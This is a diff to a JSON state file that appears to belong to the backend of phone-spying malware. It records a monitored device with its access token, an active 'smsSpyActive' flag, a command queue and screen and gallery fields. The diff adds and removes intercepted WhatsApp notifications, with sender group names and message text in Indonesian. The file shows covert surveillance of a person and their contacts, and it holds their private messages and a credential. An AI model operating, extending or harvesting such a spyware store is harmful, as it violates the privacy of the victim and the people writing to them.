@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777178469467,
+    "lastSeen": 1777178472341,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (407 pesan): 📣 Menyebut Anda",
+        "content": "~ hanz: bacot lu karbit",
+        "time": "26/04 12:52",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777178472573
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4011,14 +4019,6 @@
         "time": "26/04 11:25",
         "pkg": "com.whatsapp",
         "receivedAt": 1777173252269
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (68 pesan): ~ qɪs†",
-        "content": "mel sadar mel",
-        "time": "26/04 11:25",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173249030
       }
     ],
     "galleryPhotos": [],
